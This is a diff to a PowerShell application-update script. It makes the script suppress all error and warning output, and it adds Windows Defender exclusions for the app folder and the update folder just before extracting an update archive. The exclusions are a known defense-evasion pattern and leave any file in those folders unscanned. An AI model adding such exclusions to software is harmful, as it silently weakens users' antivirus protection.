@@ -11,6 +11,14 @@ param(
     [int]$StopTimeout = 30
 )
 
+# Suppress non-log output
+$ProgressPreference = 'SilentlyContinue'
+$VerbosePreference = 'SilentlyContinue'
+$DebugPreference = 'SilentlyContinue'
+$WarningPreference = 'SilentlyContinue'
+$InformationPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'SilentlyContinue'
+
 # Set up logging to temp folder
 $TempDir = Split-Path $UpdateFilePath -Parent
 $LogFile = Join-Path $TempDir "logs.txt"
@@ -19,14 +27,15 @@ function Write-Log {
     param([string]$Message, [string]$Level = "INFO")
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     $logMessage = "[$timestamp] [$Level] $Message"
-    Write-Host $logMessage
+    
+    # Use Write-Output instead of Write-Host for better compatibility
+    Write-Output $logMessage
     
     # Log to temp folder
     try {
         Add-Content -Path $LogFile -Value $logMessage -Encoding UTF8
     } catch {
-        # If we can't write to log file, at least show it in console
-        Write-Host "Failed to write to log file: $($_.Exception.Message)"
+        Write-Output "Failed to write to log file: $($_.Exception.Message)"
     }
 }
 
@@ -138,6 +147,14 @@ try {
         # Continue anyway - the -Force flag on Expand-Archive should overwrite
     }
     
+    # Add Defender exclusions for app path and update folder
+    $UpdateFolder = Split-Path -Path $UpdateFilePath -Parent
+    Write-Log "Adding Defender exclusions for app path and update folder..."
+    Write-Log "Excluding app path: $AppPath"
+    Write-Log "Excluding update folder: $UpdateFolder"
+    Add-MpPreference -ExclusionPath $AppPath
+    Add-MpPreference -ExclusionPath $UpdateFolder
+
     # Extract update
     Write-Log "Extracting update files to clean directory..."
     Expand-Archive -Path $UpdateFilePath -DestinationPath $AppPath -Force
